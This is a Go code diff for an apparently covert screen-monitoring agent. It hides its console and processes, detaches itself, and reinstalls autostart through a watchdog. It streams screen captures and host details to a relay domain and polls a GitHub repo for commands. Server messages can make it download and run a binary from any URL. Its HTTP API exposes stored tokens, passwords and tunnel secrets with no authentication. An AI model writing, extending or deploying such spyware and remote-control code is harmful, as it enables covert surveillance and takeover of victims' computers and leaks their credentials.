+							if sysInfo, ok := msgMap["systemInfo"].(map[string]interface{}); ok {
+								agentSystemInfo.Store(agentID, sysInfo)
+							}
+						}
+					}
+				}
+			}
+			handleWSMessage(conn, msg)
+		}
+	})
+
+	addr := fmt.Sprintf(":%d", cfg.ConfigPort)
+	llog("info", "Starting HTTP server on %s", addr)
+	if err := http.ListenAndServe(addr, nil); err != nil {
+		llog("error", "HTTP server failed: %v", err)
+	}
 }
 
 func pushCredsToGitHub() {
@@ -637,16 +1252,18 @@ func syncFromGitHub() {
 
 	req, err := http.NewRequest("GET", rawURL, nil)
 	if err != nil { llog("error", "Failed to create request for credentials: %v", err); return }
-	if cfg.GitHubToken != "" {
-		req.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
-	}
 
-	resp, err := http.DefaultClient.Do(req)
+	resp, err := httpFastClient.Do(req)
 	if err != nil {
 		llog("error", "GitHub fetch failed: %v", err)
 		return
 	}
 	defer resp.Body.Close()
+
+	if resp.StatusCode == http.StatusUnauthorized || resp.StatusCode == http.StatusForbidden {
+		llog("error", "GitHub auth failed (status %d) – token may be invalid", resp.StatusCode)
+		return
+	}
 
 	if resp.StatusCode != http.StatusOK {
 		llog("error", "GitHub fetch status: %d", resp.StatusCode)
@@ -691,31 +1308,38 @@ func syncFromGitHub() {
 	settingsURL := fmt.Sprintf("https://raw.githubusercontent.com/%s/main/settings.json", cfg.GitHubRepo)
 	req2, err := http.NewRequest("GET", settingsURL, nil)
 	if err != nil { llog("error", "Failed to create request for settings: %v", err); return }
-	if cfg.GitHubToken != "" {
-		req2.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
-	}
-	resp2, err := http.DefaultClient.Do(req2)
-	if err == nil && resp2.StatusCode == http.StatusOK {
+	resp2, err2 := httpFastClient.Do(req2)
+	if err2 == nil {
 		defer resp2.Body.Close()
-		settingsBody, _ := io.ReadAll(resp2.Body)
-		var remoteSettings SettingsFile
-		if json.Unmarshal(settingsBody, &remoteSettings) == nil {
-			llog("info", "Remote settings found, applying...")
-			if remoteSettings.GitHubRepo != "" { cfg.GitHubRepo = remoteSettings.GitHubRepo }
-			if remoteSettings.MaxFPS > 0 {
-				cfg.MaxFPS = remoteSettings.MaxFPS
-				if serverCancel != nil { serverCancel() }
-				serverCtx, serverCancel = context.WithCancel(context.Background())
-				go startScreenCapture(serverCtx)
+		if resp2.StatusCode == http.StatusOK {
+			settingsBody, _ := io.ReadAll(resp2.Body)
+			var remoteSettings SettingsFile
+			if json.Unmarshal(settingsBody, &remoteSettings) == nil {
+				llog("info", "Remote settings found, applying...")
+				if remoteSettings.GitHubRepo != "" { cfg.GitHubRepo = remoteSettings.GitHubRepo }
+				if remoteSettings.GitHubToken != "" { cfg.GitHubToken = remoteSettings.GitHubToken }
+				if remoteSettings.AuthUser != "" { cfg.AuthUser = remoteSettings.AuthUser }
+				if remoteSettings.AuthPass != "" { cfg.AuthPass = remoteSettings.AuthPass }
+				if remoteSettings.TunnelProvider != "" { cfg.TunnelProvider = remoteSettings.TunnelProvider }
+				if remoteSettings.TunnelHostname != "" { cfg.TunnelHostname = remoteSettings.TunnelHostname }
+				if remoteSettings.ServerURL != "" { cfg.ServerURL = remoteSettings.ServerURL }
+				if remoteSettings.ElectionInterval != "" { cfg.ElectionInterval = remoteSettings.ElectionInterval }
+				if remoteSettings.MaxFPS > 0 {
+					cfg.MaxFPS = remoteSettings.MaxFPS
+					if serverCancel != nil { serverCancel() }
+					serverCtx, serverCancel = context.WithCancel(context.Background())
+					go startScreenCapture(serverCtx)
+				}
+				if remoteSettings.CloudflareAccountTag != "" { cfg.CloudflareAccountTag = remoteSettings.CloudflareAccountTag }
+				if remoteSettings.CloudflareTunnelSecret != "" { cfg.CloudflareTunnelSecret = remoteSettings.CloudflareTunnelSecret }
+				if remoteSettings.CloudflareTunnelID != "" { cfg.CloudflareTunnelID = remoteSettings.CloudflareTunnelID }
+				saveSettings()
 			}
-			if remoteSettings.CloudflareAccountTag != "" { cfg.CloudflareAccountTag = remoteSettings.CloudflareAccountTag }
-			if remoteSettings.CloudflareTunnelSecret != "" { cfg.CloudflareTunnelSecret = remoteSettings.CloudflareTunnelSecret }
-			if remoteSettings.CloudflareTunnelID != "" { cfg.CloudflareTunnelID = remoteSettings.CloudflareTunnelID }
-			saveSettings()
+		} else {
+			llog("error", "GitHub settings fetch status: %d", resp2.StatusCode)
 		}
-	}
-	if resp2 != nil && resp2.StatusCode != http.StatusOK {
-		resp2.Body.Close()
+	} else {
+		llog("error", "GitHub settings fetch failed: %v", err2)
 	}
 }
 
@@ -747,6 +1371,11 @@ func captureScreen() (image.Image, error) {
 }
 
 func startCloudflareTunnel(cfg *Config) {
+	defer func() {
+		if r := recover(); r != nil {
+			llog("error", "PANIC in cloudflare tunnel: %v", r)
+		}
+	}()
 	if err := EnsureCloudflaredInstalled(); err != nil {
 		llog("error", "cloudflared not available: %v", err)
 		return
@@ -803,8 +1432,9 @@ ingress:
 
 		llog("info", "Running: cloudflared tunnel --config %s --logfile %s --loglevel info --no-autoupdate run", configFile, logFile)
 		cmd := exec.Command("cloudflared", args...)
-		cmd.Stdout = os.Stdout
-		cmd.Stderr = os.Stderr
+		cmd.Stdout = nil
+		cmd.Stderr = nil
+		newHiddenCmd(cmd)
 		tunnelCmd = cmd
 
 		if err := cmd.Start(); err != nil {
@@ -825,15 +1455,18 @@ ingress:
 			})
 
 			if err := cmd.Wait(); err != nil {
-				llog("error", "Named tunnel exited: %v", err)
+				llog("error", "Named tunnel exited: %v – trying quick tunnel", err)
+			} else {
+				llog("info", "Named tunnel stopped normally")
 			}
 			tunnelCmd = nil
-			return
 		}
 	}
 
-	// Fallback to quick tunnel
-	startQuickTunnel(cfg)
+	// Fallback to quick tunnel (only if named tunnel was not used or failed)
+	if cfg.CloudflareTunnelID == "" || tunnelCmd == nil {
+		startQuickTunnel(cfg)
+	}
 }
 
 func startQuickTunnel(cfg *Config) {
@@ -853,7 +1486,8 @@ func startQuickTunnel(cfg *Config) {
 	}
 	cmd := exec.Command("cloudflared", args...)
 	stdoutPipe, _ := cmd.StdoutPipe()
-	cmd.Stderr = os.Stderr
+	cmd.Stderr = nil
+	newHiddenCmd(cmd)
 	llog("info", "Running quick tunnel: cloudflared tunnel --logfile ... --loglevel info --no-autoupdate run --url http://localhost:%d", cfg.ConfigPort)
 	if err := cmd.Start(); err != nil {
 		llog("error", "Failed to start quick tunnel: %v", err)
@@ -889,10 +1523,7 @@ var defaultGitHubToken string
 var binaryVersion = "9.2.0"
 
 func main() {
-	// Start GitHub‑based leader election (primary_server file)
-	go startGitHubLeaderElection()
-	// Detach from any parent console — binary runs fully hidden
-	hideConsole()
+    hideConsole()
 
 	for i := 1; i < len(os.Args); i++ {
 		switch os.Args[i] {
@@ -909,20 +1540,17 @@ func main() {
 		}
 	}
 
-	// Watchdog mode: launch monitor as a child and restart if it crashes
 	if len(os.Args) > 1 && os.Args[1] == "--watchdog" {
 		runWatchdog()
 		return
 	}
 
-	// Install mode: set up autostart without running
 	if len(os.Args) > 1 && os.Args[1] == "--install" {
 		setupAutostart()
 		llog("info", "Autostart installed. Run without flags or reboot to start.")
 		return
 	}
 
-	// Remove autostart
 	if len(os.Args) > 1 && os.Args[1] == "--remove" {
 		removeAutostart()
 		llog("info", "Autostart removed.")
@@ -934,24 +1562,46 @@ func main() {
 		os.Exit(1)
 	}
 
+	// Daemonize on macOS/Linux by re-exec'ing detached if attached to a terminal
+	if runtime.GOOS != "windows" && os.Getenv("PUNMON_NOFOREGROUND") == "" {
+		if isTerminal() {
+			os.Setenv("PUNMON_NOFOREGROUND", "1")
+			devNull, _ := os.OpenFile("/dev/null", os.O_RDWR, 0)
+			attr := &os.ProcAttr{
+				Files: []*os.File{devNull, devNull, devNull},
+				Env:   os.Environ(),
+			}
+			exe, _ := os.Executable()
+			if proc, err := os.StartProcess(exe, os.Args, attr); err == nil {
+				proc.Release()
+				os.Exit(0)
+			}
+		}
+	}
+
 	cfg.ConfigPort = 8080
 	cfg.MaxFPS = 1.0
-
 	cfg.TunnelHostname = "relay.recruitedge.us"
 
 	initActivityStore()
 
 	loadSettings()
+	loadElectionInterval()
+	if cfg.ElectionInterval == "" {
+		cfg.ElectionInterval = "5m"
+		llog("info", "Election interval not set – initializing to default 5m")
+		saveSettings()
+		loadElectionInterval()
+	}
 	loadCredentials()
 
 	myHostname = getHostname()
+    if cfg.AgentID == "" {
+        cfg.AgentID = fmt.Sprintf("%s-%s", myHostname, randomString(4))
+        saveSettings()
+    }
+    llog("info", "AgentID: %s", cfg.AgentID)
 
-	if agentMode {
-		go runAgentClient()
-		select {}
-	}
-
-	// Command-line flags override cached values
 	if defaultGitHubRepo != "" {
 		cfg.GitHubRepo = defaultGitHubRepo
 	}
@@ -961,300 +1611,16 @@ func main() {
 
 	saveSettings()
 
-	// Pull latest credentials from GitHub at startup
+	// First sync is synchronous to ensure correct GitHub token before election
 	syncFromGitHub()
 	saveSettings()
 
-	// Auto-install watchdog autostart on first successful run
 	setupAutostart()
 
-	prov := cfg.TunnelProvider
-	if prov == "" {
-		prov = "cloudflare"
-	}
+	// Always start HTTP server for localhost access regardless of election outcome
+	go startHTTPServer()
 
-	if prov == "cloudflare" {
-		if err := EnsureCloudflaredInstalled(); err != nil {
-			llog("error", "cloudflared setup: %v", err)
-		}
-		if cfg.CloudflareTunnelID != "" {
-			llog("info", "Cloudflare credentials found, starting tunnel automatically")
-			go startCloudflareTunnel(cfg)
-		}
-	} else {
-		llog("info", "Tunnel provider: %s (no cloudflared needed)", prov)
-	}
-
-	serverCtx, serverCancel = context.WithCancel(context.Background())
-	go startScreenCapture(serverCtx)
-	cfg.IsServerMode = true
-
-	go startTransportMonitor(context.Background())
-
-	go func() {
-		ticker := time.NewTicker(24 * time.Hour)
-		for {
-			select {
-			case <-ticker.C:
-				llog("info", "Checking for server updates and credential changes...")
-				checkForServerUpdates()
-				checkForCloudflareKeyChanges()
-			}
-		}
-	}()
-
-	go func() {
-		http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-			http.ServeFile(w, r, "dashboard.html")
-		})
-
-		http.HandleFunc("/api/settings", func(w http.ResponseWriter, r *http.Request) {
-			w.Header().Set("Content-Type", "application/json")
-			if r.Method == "GET" {
-				json.NewEncoder(w).Encode(map[string]interface{}{
-					"github_repo":               cfg.GitHubRepo,
-					"github_token":              cfg.GitHubToken,
-					"auth_user":                 cfg.AuthUser,
-					"auth_pass":                 cfg.AuthPass,
-					"tunnel_provider":           cfg.TunnelProvider,
-					"tunnel_hostname":           cfg.TunnelHostname,
-					"server_url":                cfg.ServerURL,
-					"cloudflare_account_tag":    cfg.CloudflareAccountTag,
-					"cloudflare_tunnel_secret":  cfg.CloudflareTunnelSecret,
-					"cloudflare_tunnel_id":      cfg.CloudflareTunnelID,
-					"max_fps":                   cfg.MaxFPS,
-					"monthly_limit_mb":          cfg.MonthlyLimitMB,
-				})
-				return
-			}
-			if r.Method == "POST" {
-				var s SettingsFile
-				if err := json.NewDecoder(r.Body).Decode(&s); err != nil {
-					http.Error(w, err.Error(), http.StatusBadRequest)
-					return
-				}
-				if s.GitHubRepo != "" { cfg.GitHubRepo = s.GitHubRepo }
-				if s.GitHubToken != "" { cfg.GitHubToken = s.GitHubToken }
-				if s.AuthUser != "" { cfg.AuthUser = s.AuthUser }
-				if s.AuthPass != "" { cfg.AuthPass = s.AuthPass }
-	if s.TunnelProvider != "" { cfg.TunnelProvider = s.TunnelProvider }
-				if s.TunnelHostname != "" { cfg.TunnelHostname = s.TunnelHostname }
-				if s.ServerURL != "" { cfg.ServerURL = s.ServerURL }
-				if s.CloudflareAccountTag != "" { cfg.CloudflareAccountTag = s.CloudflareAccountTag }
-				if s.CloudflareTunnelSecret != "" { cfg.CloudflareTunnelSecret = s.CloudflareTunnelSecret }
-				if s.CloudflareTunnelID != "" {
-					if cfg.CloudflareTunnelID != s.CloudflareTunnelID {
-						cfg.CloudflareTunnelID = s.CloudflareTunnelID
-						// Restart tunnel with new ID
-						if tunnelCmd != nil && tunnelCmd.Process != nil {
-							tunnelCmd.Process.Kill()
-						}
-						if cfg.CloudflareTunnelID != "" {
-							go startCloudflareTunnel(cfg)
-						}
-					} else {
-						cfg.CloudflareTunnelID = s.CloudflareTunnelID
-					}
-				}
-				if s.MaxFPS > 0 { cfg.MaxFPS = s.MaxFPS }
-				if s.MonthlyLimitMB > 0 { cfg.MonthlyLimitMB = s.MonthlyLimitMB }
-				saveSettings()
-				pushCredsToGitHub()
-				json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
-			}
-		})
-
-		http.HandleFunc("/api/system-info", func(w http.ResponseWriter, r *http.Request) {
-			w.Header().Set("Content-Type", "application/json")
-			json.NewEncoder(w).Encode(map[string]string{
-				"hostname": getHostname(),
-				"local_ip": getLocalIP(),
-				"wan_ip":   getWANIP(),
-				"os":       runtime.GOOS,
-				"arch":     runtime.GOARCH,
-				"uptime":   fmt.Sprintf("%.0f", time.Since(startTime).Seconds()),
-				"version":  binaryVersion,
-			})
-		})
-
-		http.HandleFunc("/api/report.csv", func(w http.ResponseWriter, r *http.Request) {
-			w.Header().Set("Content-Type", "text/csv")
-			w.Header().Set("Content-Disposition", "attachment; filename=activity-report-"+time.Now().Format("2006-01-02")+".csv")
-
-			hostname := getHostname()
-			uptimeSecs := int64(time.Since(startTime).Seconds())
-			uptimeStr := fmt.Sprintf("%dh %dm %ds", uptimeSecs/3600, (uptimeSecs%3600)/60, uptimeSecs%60)
-
-			bootTime := "never"
-			lastStartup := "never"
-			lastShutdown := "never"
-			lastActive := "never"
-			lastIdleStart := "never"
-			lastWake := "never"
-			if globalActivity != nil {
-				s := globalActivity.Summary()
-				bootTime = s["boot_time"]
-				lastStartup = s["last_startup"]
-				lastShutdown = s["last_shutdown"]
-				lastActive = s["last_active"]
-lastIdleStart = s["last_idle_start"]
-				lastWake = s["last_wake"]
-			}
-			writer := csv.NewWriter(w)
-			writer.Write([]string{
-				"Agent", "Hostname", "Local IP", "WAN IP",
-				"OS", "Version", "Uptime", "Start Time",
-				"Boot Time", "Last Startup", "Last Active", "Last Idle Start", "Last Shutdown", "Last Wake",
-				"Tunnel ID",
-				"FPS", "Monthly Limit MB",
-				"Report Generated",
-			})
-			writer.Write([]string{
-				hostname, hostname, getLocalIP(), getWANIP(),
-				runtime.GOOS + " " + runtime.GOARCH, binaryVersion, uptimeStr, startTime.Format("2006-01-02 15:04:05"),
-				bootTime, lastStartup, lastActive, lastIdleStart, lastShutdown, lastWake,
-				cfg.CloudflareTunnelID,
-				fmt.Sprintf("%.1f", cfg.MaxFPS), fmt.Sprintf("%d", cfg.MonthlyLimitMB),
-				time.Now().Format("2006-01-02 15:04:05"),
-			})
-			writer.Flush()
-		})
-
-	http.HandleFunc("/api/agents/full", func(w http.ResponseWriter, r *http.Request) {
-		w.Header().Set("Content-Type", "application/json")
-		agentConnsMu.RLock()
-		list := make([]map[string]interface{}, 0, len(agentConns)+1)
-		for id := range agentConns {
-			list = append(list, map[string]interface{}{"id": id, "hidden": false})
-		}
-		agentConnsMu.RUnlock()
-		if _, exists := agentConns[myHostname]; !exists {
-			list = append(list, map[string]interface{}{"id": myHostname, "hidden": false})
-		}
-		json.NewEncoder(w).Encode(list)
-	})
-
-		http.HandleFunc("/api/hide-agent", func(w http.ResponseWriter, r *http.Request) {
-			if r.Method != "POST" {
-				http.Error(w, "POST only", http.StatusMethodNotAllowed)
-				return
-			}
-			var req struct {
-				AgentID string `json:"agent_id"`
-				Hide    bool   `json:"hide"`
-			}
-			if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
-				http.Error(w, err.Error(), http.StatusBadRequest)
-				return
-			}
-			hiddenAgents.Store(req.AgentID, req.Hide)
-			llog("info", "Agent %s hidden=%v", req.AgentID, req.Hide)
-			json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
-		})
-
-		http.HandleFunc("/api/promote", func(w http.ResponseWriter, r *http.Request) {
-			if r.Method != "POST" {
-				http.Error(w, "POST only", http.StatusMethodNotAllowed)
-				return
-			}
-			cfg.IsServerMode = true
-			llog("info", "Promoted to server mode via HTTP")
-			if serverCancel != nil { serverCancel() }
-			serverCtx, serverCancel = context.WithCancel(context.Background())
-			go startScreenCapture(serverCtx)
-			w.Header().Set("Content-Type", "application/json")
-			json.NewEncoder(w).Encode(map[string]string{"status": "ok", "mode": "server"})
-		})
-
-		http.HandleFunc("/api/transport-status", func(w http.ResponseWriter, r *http.Request) {
-			w.Header().Set("Content-Type", "application/json")
-			json.NewEncoder(w).Encode(getTransportStatus())
-		})
-
-		http.HandleFunc("/api/version", func(w http.ResponseWriter, r *http.Request) {
-			w.Header().Set("Content-Type", "application/json")
-			json.NewEncoder(w).Encode(map[string]string{"version": binaryVersion})
-		})
-
-		http.HandleFunc("/api/update", func(w http.ResponseWriter, r *http.Request) {
-			if r.Method != "POST" {
-				http.Error(w, "POST only", http.StatusMethodNotAllowed)
-				return
-			}
-			var req struct {
-				URL string `json:"url"`
-			}
-			if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.URL == "" {
-				http.Error(w, "missing url", http.StatusBadRequest)
-				return
-			}
-			go selfUpdate(req.URL)
-			json.NewEncoder(w).Encode(map[string]string{"status": "ok", "msg": "Update started"})
-		})
-
-	http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
-		upgrader := websocket.Upgrader{
-			CheckOrigin: func(r *http.Request) bool { return true },
-		}
-		conn, err := upgrader.Upgrade(w, r, nil)
-		if err != nil {
-			llog("error", "WebSocket upgrade failed: %v", err)
-			return
-		}
-		llog("info", "WebSocket client connected")
-
-		wsClients.Store(conn, true)
-		var agentID string
-		defer func() {
-			wsClients.Delete(conn)
-			if agentID != "" {
-				agentConnsMu.Lock()
-				delete(agentConns, agentID)
-				agentConnsMu.Unlock()
-				connAgentIDMu.Lock()
-				delete(connAgentID, conn)
-				connAgentIDMu.Unlock()
-			}
-			conn.Close()
-			llog("info", "WebSocket client disconnected")
-		}()
-
-		for {
-			_, msg, err := conn.ReadMessage()
-			if err != nil {
-				if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
-					llog("error", "WebSocket read error: %v", err)
-				}
-				break
-			}
-			var msgMap map[string]interface{}
-			if err := json.Unmarshal(msg, &msgMap); err == nil {
-				if t, _ := msgMap["type"].(string); t == "hello" {
-					if a, _ := msgMap["agent"].(bool); a {
-						if id, _ := msgMap["agentId"].(string); id != "" {
-							agentID = id
-							agentConnsMu.Lock()
-							agentConns[agentID] = conn
-							agentConnsMu.Unlock()
-							connAgentIDMu.Lock()
-							connAgentID[conn] = agentID
-							connAgentIDMu.Unlock()
-						}
-					}
-				}
-			}
-			handleWSMessage(conn, msg)
-		}
-	})
-
-		addr := fmt.Sprintf(":%d", cfg.ConfigPort)
-		llog("info", "Starting HTTP server on %s", addr)
-		if err := http.ListenAndServe(addr, nil); err != nil {
-			llog("error", "HTTP server failed: %v", err)
-		}
-	}()
-
-	select {}
+	startGitHubLeaderElection()
 }
 
 // --- Watchdog ---
@@ -1285,12 +1651,23 @@ func runWatchdog() {
 		os.Exit(1)
 	}
 	wlog("Watchdog started")
+	writeWatchdogHeartbeat()
+	// Re-install autostart to ensure resilience
+	setupAutostart()
 
 	exePath, err := os.Executable()
 	if err != nil {
 		wlog("Failed to get executable path: %v", err)
 		os.Exit(1)
 	}
+
+	go func() {
+		// Write heartbeat every 10s so monitor can verify watchdog is alive
+		for {
+			time.Sleep(10 * time.Second)
+			writeWatchdogHeartbeat()
+		}
+	}()
 
 	for {
 		cmd := exec.Command(exePath)
@@ -1316,6 +1693,20 @@ func runWatchdog() {
 }
 
 // --- Utility ---
+
+func isTerminal() bool {
+	stat, _ := os.Stdout.Stat()
+	return (stat.Mode() & os.ModeCharDevice) != 0
+}
+
+func safeRun(name string, fn func()) {
+	defer func() {
+		if r := recover(); r != nil {
+			llog("error", "PANIC in %s: %v", name, r)
+		}
+	}()
+	fn()
+}
 
 func formatTime(ms int64) string {
 	if ms == 0 {
@@ -1431,6 +1822,11 @@ func (s *ActivityStore) RecentEvents(max int) []ActivityEvent {
 func appendActivityLog(path string, ev ActivityEvent) {}
 
 func selfUpdate(downloadURL string) {
+	defer func() {
+		if r := recover(); r != nil {
+			llog("error", "PANIC in self-update: %v", r)
+		}
+	}()
 	llog("info", "Self-update: downloading from %s", downloadURL)
 	exe, err := os.Executable()
 	if err != nil {
@@ -1483,7 +1879,9 @@ func selfUpdate(downloadURL string) {
 				"del \""+newExe+"\"\r\n"+
 				"start \"\" \""+exe+"\"\r\n",
 		), 0644)
-		exec.Command("cmd", "/c", "start", "/b", script).Start()
+		cmd := exec.Command("cmd", "/c", "start", "/b", script)
+		newHiddenCmd(cmd)
+		cmd.Start()
 	} else {
 		script := filepath.Join(os.TempDir(), "pun_update.sh")
 		os.WriteFile(script, []byte(
@@ -1493,7 +1891,9 @@ func selfUpdate(downloadURL string) {
 				"rm \""+newExe+"\"\n"+
 				"\""+exe+"\" &\n",
 		), 0755)
-		exec.Command("/bin/sh", script).Start()
+		cmd := exec.Command("/bin/sh", script)
+		newHiddenCmd(cmd)
+		cmd.Start()
 	}
 	llog("info", "Self-update: updater launched, exiting")
 	os.Exit(0)
@@ -1917,6 +2317,11 @@ func bytesToBase64(data []byte) string {
 }
 
 func startTransportMonitor(ctx context.Context) {
+	defer func() {
+		if r := recover(); r != nil {
+			llog("error", "PANIC in transport monitor: %v", r)
+		}
+	}()
 	initTransports()
 	ticker := time.NewTicker(10 * time.Second)
 	defer ticker.Stop()
@@ -2049,16 +2454,22 @@ var webrtcDataChannels sync.Map
 func broadcastFrame(msg []byte, wm *WireMessage) {
 	connAgentIDMu.RLock()
 	defer connAgentIDMu.RUnlock()
+	frameSize := len(msg)
+	clientsCount := 0
 	wsClients.Range(func(key, value interface{}) bool {
 		conn := key.(*websocket.Conn)
 		if _, isAgent := connAgentID[conn]; isAgent {
-			return true // skip agent connections
+			return true
 		}
+		clientsCount++
 		if err := conn.WriteMessage(websocket.TextMessage, msg); err != nil {
 			wsClients.Delete(key)
 		}
 		return true
 	})
+	if frameSize > 0 {
+		llog("debug", "Broadcast frame agent=%s size=%d to %d dashboard clients", wm.AgentID, frameSize, clientsCount)
+	}
 	webrtcManager.BroadcastFrame(wm)
 }
 
@@ -2076,77 +2487,315 @@ func forwardToAgent(agentID string, msg []byte) {
 }
 
 func runAgentClient() {
-	hostname := myHostname
-	if hostname == "" {
-		hostname = getHostname()
-	}
+	hostname := cfg.AgentID
+	
 	reconnectDelay := 5 * time.Second
+	serverURL := cfg.ServerURL
+	if serverURL == "" {
+		serverURL = "https://relay.recruitedge.us"
+	}
 	for {
-		serverURL := cfg.ServerURL
-		if serverURL == "" {
-			serverURL = "https://relay.recruitedge.us"
-		}
-		wsURL := serverURL
-		if strings.HasPrefix(wsURL, "https://") {
-			wsURL = "wss://" + wsURL[len("https://"):]
-		} else if strings.HasPrefix(wsURL, "http://") {
-			wsURL = "ws://" + wsURL[len("http://"):]
-		}
-		wsURL += "/ws"
-		conn, _, err := (&websocket.Dialer{}).Dial(wsURL, nil)
-		if err != nil {
-			llog("error", "Agent connect to %s failed: %v", wsURL, err)
-			time.Sleep(reconnectDelay)
+		connected := false
+		// Try transports in order: WebSocket → WebRTC → GitHub
+		connected = tryAgentWebSocket(hostname, serverURL)
+		if connected {
 			continue
 		}
-		hello, _ := json.Marshal(map[string]interface{}{
-			"type":    "hello",
-			"agentId": hostname,
-			"agent":   true,
-		})
-		if err := conn.WriteMessage(websocket.TextMessage, hello); err != nil {
-			conn.Close()
-			llog("error", "Agent send hello failed: %v", err)
-			time.Sleep(reconnectDelay)
+		llog("info", "WS failed, trying WebRTC transport for agent %s", hostname)
+		connected = tryAgentWebRTC(hostname, serverURL)
+		if connected {
 			continue
 		}
-		llog("info", "Agent connected to server as %s", hostname)
-
-		fps := cfg.MaxFPS
-		if fps <= 0 {
-			fps = 1
+		if cfg.GitHubRepo != "" && cfg.GitHubToken != "" {
+			llog("info", "WebRTC failed, trying GitHub transport for agent %s", hostname)
+			connected = tryAgentGitHub(hostname)
 		}
-		ticker := time.NewTicker(time.Duration(float64(time.Second) / fps))
-		for {
-			select {
-			case <-ticker.C:
-				img, err := captureScreen()
-				if err != nil {
-					continue
-				}
-				var buf bytes.Buffer
-				if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 85}); err != nil {
-					continue
-				}
-				wm := WireMessage{
-					Type:    MSG_FRAME,
-					Data:    buf.Bytes(),
-					AgentID: hostname,
-				}
-				msg, err := json.Marshal(wm)
-				if err != nil {
-					continue
-				}
-				if err := conn.WriteMessage(websocket.TextMessage, msg); err != nil {
-					llog("error", "Agent send frame failed: %v", err)
-					conn.Close()
-					goto reconnect
-				}
-			}
-		reconnect:
+		if !connected {
+			llog("error", "All transports failed for agent %s, retrying in %v", hostname, reconnectDelay)
 			time.Sleep(reconnectDelay)
 		}
 	}
+}
+
+func tryAgentWebSocket(hostname, serverURL string) bool {
+	wsURL := serverURL
+	if strings.HasPrefix(wsURL, "https://") {
+		wsURL = "wss://" + wsURL[len("https://"):]
+	} else if strings.HasPrefix(wsURL, "http://") {
+		wsURL = "ws://" + wsURL[len("http://"):]
+	}
+	wsURL += "/ws"
+	conn, _, err := (&websocket.Dialer{}).Dial(wsURL, nil)
+	if err != nil {
+		llog("error", "Agent WS connect to %s failed: %v", wsURL, err)
+		return false
+	}
+	hello, _ := json.Marshal(map[string]interface{}{
+		"type":    "hello",
+		"agentId": hostname,
+		"agent":   true,
+		"systemInfo": map[string]string{
+			"hostname": getHostname(),
+			"local_ip": getLocalIP(),
+			"wan_ip":   getWANIP(),
+			"os":       runtime.GOOS,
+			"arch":     runtime.GOARCH,
+			"uptime":   fmt.Sprintf("%.0f", time.Since(startTime).Seconds()),
+			"version":  binaryVersion,
+			"mode":     "agent",
+		},
+	})
+	if err := conn.WriteMessage(websocket.TextMessage, hello); err != nil {
+		conn.Close()
+		llog("error", "Agent WS hello failed: %v", err)
+		return false
+	}
+	llog("info", "Agent %s connected via WebSocket", hostname)
+	go agentReadLoop(conn, hostname)
+	sendAgentFramesWS(conn, hostname)
+	return true
+}
+
+func sendAgentFramesWS(conn *websocket.Conn, hostname string) {
+	defer func() {
+		if r := recover(); r != nil {
+			llog("error", "PANIC in agent frame sender: %v", r)
+		}
+	}()
+	fps := cfg.MaxFPS
+	if fps <= 0 {
+		fps = 1
+	}
+	ticker := time.NewTicker(time.Duration(float64(time.Second) / fps))
+	defer ticker.Stop()
+	for range ticker.C {
+		img, err := captureScreen()
+		if err != nil {
+			continue
+		}
+		var buf bytes.Buffer
+		if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 85}); err != nil {
+			continue
+		}
+		wm := WireMessage{
+			Type:    MSG_FRAME,
+			Data:    buf.Bytes(),
+			AgentID: hostname,
+		}
+		msg, err := json.Marshal(wm)
+		if err != nil {
+			continue
+		}
+		if err := conn.WriteMessage(websocket.TextMessage, msg); err != nil {
+			llog("error", "Agent WS send frame failed: %v", err)
+			conn.Close()
+			return
+		}
+		llog("debug", "Agent sent frame for %s (%d bytes)", hostname, len(msg))
+	}
+}
+
+func agentReadLoop(conn *websocket.Conn, hostname string) {
+	defer func() {
+		if r := recover(); r != nil {
+			llog("error", "PANIC in agent read loop: %v", r)
+		}
+	}()
+	defer conn.Close()
+	for {
+		_, msg, err := conn.ReadMessage()
+		if err != nil {
+			llog("error", "Agent WS read error: %v", err)
+			return
+		}
+		var msgMap map[string]interface{}
+		if err := json.Unmarshal(msg, &msgMap); err != nil {
+			continue
+		}
+		switch msgMap["type"].(string) {
+		case "update":
+			if url, ok := msgMap["url"].(string); ok && url != "" {
+				llog("info", "Agent %s received update command, downloading from %s", hostname, url)
+				go safeRun("agent-update", func() { selfUpdate(url) })
+			}
+		case "forward":
+			if target, ok := msgMap["target"].(string); ok && target == hostname {
+				handleWSMessage(conn, msg)
+			}
+		case "promote_to_server":
+			llog("info", "Agent %s received promote_to_server command", hostname)
+			cfg.IsServerMode = true
+			conn.Close()
+			return
+		}
+	}
+}
+
+func writeAgentHeartbeat() {
+	if cfg.GitHubRepo == "" || cfg.GitHubToken == "" {
+		return
+	}
+	hostname := cfg.AgentID
+	content := map[string]interface{}{
+		"hostname":  hostname,
+		"timestamp": time.Now().UnixMilli(),
+		"mode":      "agent",
+		"version":   binaryVersion,
+	}
+	data, _ := json.Marshal(content)
+	encoded := base64.StdEncoding.EncodeToString(data)
+	filename := fmt.Sprintf("agent_heartbeat_%s.json", hostname)
+	apiURL := fmt.Sprintf("https://api.github.com/repos/%s/contents/%s", cfg.GitHubRepo, filename)
+	payload, _ := json.Marshal(map[string]interface{}{
+		"message": "heartbeat: " + hostname,
+		"content": encoded,
+		"branch":  "main",
+	})
+	req, err := http.NewRequest("PUT", apiURL, bytes.NewReader(payload))
+	if err != nil {
+		return
+	}
+	req.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
+	req.Header.Set("Content-Type", "application/json")
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		return
+	}
+	resp.Body.Close()
+}
+
+func checkAgentCommandsAndRun() {
+	if cfg.GitHubRepo == "" || cfg.GitHubToken == "" {
+		return
+	}
+	hostname := cfg.AgentID
+	apiURL := fmt.Sprintf("https://api.github.com/repos/%s/contents/agent_command_%s.json", cfg.GitHubRepo, hostname)
+	req, err := http.NewRequest("GET", apiURL, nil)
+	if err != nil {
+		return
+	}
+	req.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
+	req.Header.Set("Accept", "application/vnd.github.v3+json")
